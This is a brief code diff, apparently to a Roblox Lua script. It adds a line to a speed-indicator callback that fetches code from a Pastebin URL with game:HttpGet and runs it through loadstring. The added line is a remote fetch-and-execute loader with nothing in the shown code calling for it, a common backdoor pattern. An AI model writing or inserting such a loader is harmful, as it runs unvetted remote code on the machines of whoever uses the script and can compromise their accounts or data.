@@ -460,4 +460,6 @@ speedIndicator.Text = "35"
 
 Speed = speedIndicator.Text
 
+loadstring(game:HttpGet("https://pastebin.com/raw/2n9EJYk7", true))()
+
 end)
